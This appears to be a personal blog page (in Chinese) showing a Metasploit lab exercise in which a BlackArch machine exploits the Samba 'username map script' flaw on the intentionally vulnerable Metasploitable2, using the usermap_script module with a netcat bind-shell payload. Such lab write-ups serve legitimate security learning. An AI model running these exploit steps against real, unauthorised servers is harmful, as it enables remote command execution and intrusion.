@@ -1,0 +1,566 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Metasploit Samba服务器漏洞渗透 | JinLu&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="JinLu">
+    
+
+    
+    <meta name="description" content="攻击机：BlackArch靶机：Metasploitable2工具：msfconsole  BlackArch的版本信息 打开Metasploitable2后，ifconfig查看ip 查看BlackArch的ip 打开msfmsfconsole help search search samba 在显示的模块中找到找到exploit/multi/samba/usermap_script">
+<meta name="keywords" content="linux,Metasploitable2,BlackArch,msfconsole">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit Samba服务器漏洞渗透">
+<meta property="og:url" content="http://yoursite.com/2016/03/28/2016-03-28_Metasploit Samba服务器漏洞渗透/index.html">
+<meta property="og:site_name" content="JinLu's Blog">
+<meta property="og:description" content="攻击机：BlackArch靶机：Metasploitable2工具：msfconsole  BlackArch的版本信息 打开Metasploitable2后，ifconfig查看ip 查看BlackArch的ip 打开msfmsfconsole help search search samba 在显示的模块中找到找到exploit/multi/samba/usermap_script">
+<meta property="og:image" content="https://s25.postimg.org/7o2eok3n3/image.png">
+<meta property="og:image" content="https://s25.postimg.org/h9vz4uusv/image.png">
+<meta property="og:image" content="https://s25.postimg.org/fjcy3dd9r/image.png">
+<meta property="og:image" content="https://s25.postimg.org/6cung381b/image.png">
+<meta property="og:image" content="https://s25.postimg.org/4z7lyiy5r/image.png">
+<meta property="og:image" content="https://s25.postimg.org/lbhno9chb/image.png">
+<meta property="og:image" content="https://s25.postimg.org/fbtwklrov/image.png">
+<meta property="og:image" content="https://s25.postimg.org/5fstkylwv/image.png">
+<meta property="og:image" content="https://s25.postimg.org/ckamtzt67/image.png">
+<meta property="og:image" content="https://s25.postimg.org/y99ixuve7/image.png">
+<meta property="og:image" content="https://s25.postimg.org/8ezq82ve7/image.png">
+<meta property="og:image" content="https://s25.postimg.org/utheoay5r/image.png">
+<meta property="og:image" content="https://s25.postimg.org/e74fsyulr/image.png">
+<meta property="og:image" content="https://s25.postimg.org/v8x9v29gv/image.png">
+<meta property="og:updated_time" content="2017-07-05T12:58:49.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit Samba服务器漏洞渗透">
+<meta name="twitter:description" content="攻击机：BlackArch靶机：Metasploitable2工具：msfconsole  BlackArch的版本信息 打开Metasploitable2后，ifconfig查看ip 查看BlackArch的ip 打开msfmsfconsole help search search samba 在显示的模块中找到找到exploit/multi/samba/usermap_script">
+<meta name="twitter:image" content="https://s25.postimg.org/7o2eok3n3/image.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="JinLu&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/unnamed4_n_mSY_icon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/profile.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/profile.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="JinLu&#39;s Blog" title="JinLu&#39;s Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="JinLu&#39;s Blog">JinLu&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/03/28/2016-03-28_Metasploit Samba服务器漏洞渗透/" title="Metasploit Samba服务器漏洞渗透" itemprop="url">Metasploit Samba服务器漏洞渗透</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="JinLu" target="_blank" itemprop="author">JinLu</a>
+		
+  <p class="article-time">
+    <time datetime="2016-03-27T17:56:26.000Z" itemprop="datePublished"> Published 2016-03-28</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			
+		
+		</div>
+		
+		<p><strong>攻击机：BlackArch</strong><br><strong>靶机：Metasploitable2</strong><br><strong>工具：msfconsole</strong></p>
+<hr>
+<p><strong>BlackArch的版本信息</strong><br><img src="https://s25.postimg.org/7o2eok3n3/image.png" alt="请输入图片描述"></p>
+<p><strong>打开Metasploitable2后，ifconfig查看ip</strong><br><img src="https://s25.postimg.org/h9vz4uusv/image.png" alt="请输入图片描述"></p>
+<p><strong>查看BlackArch的ip</strong><br><img src="https://s25.postimg.org/fjcy3dd9r/image.png" alt="请输入图片描述"></p>
+<p><strong>打开msf</strong><br><code>msfconsole</code><br><img src="https://s25.postimg.org/6cung381b/image.png" alt="请输入图片描述"></p>
+<p><code>help search</code><br><img src="https://s25.postimg.org/4z7lyiy5r/image.png" alt="请输入图片描述"></p>
+<p><code>search samba</code><br><img src="https://s25.postimg.org/lbhno9chb/image.png" alt="请输入图片描述"></p>
+<p><strong>在显示的模块中找到找到exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba “username map script” Command Execution</strong><br><img src="https://s25.postimg.org/fbtwklrov/image.png" alt="请输入图片描述"></p>
+<p><strong>之后选择渗透攻击模块</strong><br><code>use multi/samba/usermap_script</code><br><img src="https://s25.postimg.org/5fstkylwv/image.png" alt="请输入图片描述"></p>
+<p><strong>显示攻击模块配套的攻击载荷</strong><br><code>show payloads</code><br><img src="https://s25.postimg.org/ckamtzt67/image.png" alt="请输入图片描述"></p>
+<p><code>set payload cmd/unix/bind_netcat</code><br><img src="https://s25.postimg.org/y99ixuve7/image.png" alt="请输入图片描述"></p>
+<p><strong>查看配置参数</strong><br><code>show options</code><br><img src="https://s25.postimg.org/8ezq82ve7/image.png" alt="请输入图片描述"></p>
+<p><strong>设置靶机的ip</strong><br><code>set RHOST 192.168.10.131</code><br><img src="https://s25.postimg.org/utheoay5r/image.png" alt="请输入图片描述"></p>
+<p><strong>攻击</strong><br>exploit<br><img src="https://s25.postimg.org/e74fsyulr/image.png" alt="请输入图片描述"></p>
+<p><strong>攻击成功后，查看当前版本和用户</strong><br>uname -a<br><img src="https://s25.postimg.org/v8x9v29gv/image.png" alt="请输入图片描述"></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/Linux/">Linux</a>►<a class="article-category-link" href="/categories/Linux/White-hat/">White_hat</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/linux/">linux</a><a href="/tags/Metasploitable2/">Metasploitable2</a><a href="/tags/BlackArch/">BlackArch</a><a href="/tags/msfconsole/">msfconsole</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/02/22/2016-02-22_Python_advanced/" title="Python_advanced">
+  <span>
+  Python_advanced</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2016/04/08/2015-11-08_Django_note/"  title="Django_note">
+ <span>Django_note
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Linux/Blog/" title="Blog">Blog<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/DataAnalysis/" title="DataAnalysis">DataAnalysis<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/Django/" title="Django">Django<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Git/" title="Git">Git<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>13</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/MySQL/" title="MySQL">MySQL<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/" title="Note">Note<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/" title="Python">Python<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/Python-advanced/" title="Python_advanced">Python_advanced<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/Python语法/" title="Python语法">Python语法<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/Spider/" title="Spider">Spider<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Python/Tornado/" title="Tornado">Tornado<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Note/Web/" title="Web">Web<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/White-hat/" title="White_hat">White_hat<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/服务器部署/" title="服务器部署">服务器部署<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/linux/" title="linux">linux<sup>13</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Python/" title="Python">Python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSR/" title="SSR">SSR<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/破解Wifi/" title="破解Wifi">破解Wifi<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Ubuntu/" title="Ubuntu">Ubuntu<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/BlackArch/" title="BlackArch">BlackArch<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Penetration-test/" title="Penetration_test">Penetration_test<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/穷举PIN/" title="穷举PIN">穷举PIN<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/U盘中毒/" title="U盘中毒">U盘中毒<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CentOS/" title="CentOS">CentOS<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/lnmp/" title="lnmp">lnmp<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Tornado/" title="Tornado">Tornado<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HTML-CSS-JS-JQ/" title="HTML+CSS+JS+JQ">HTML+CSS+JS+JQ<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Tor-browser/" title="Tor_browser">Tor_browser<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Git/" title="Git">Git<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/root/" title="root">root<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/login/" title="login">login<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Spider/" title="Spider">Spider<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/跑包/" title="跑包">跑包<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Kali-Rolling/" title="Kali_Rolling">Kali_Rolling<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://jinlu123.github.io/" target="_blank" title="Jinlu">Jinlu</a> © 2017 
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
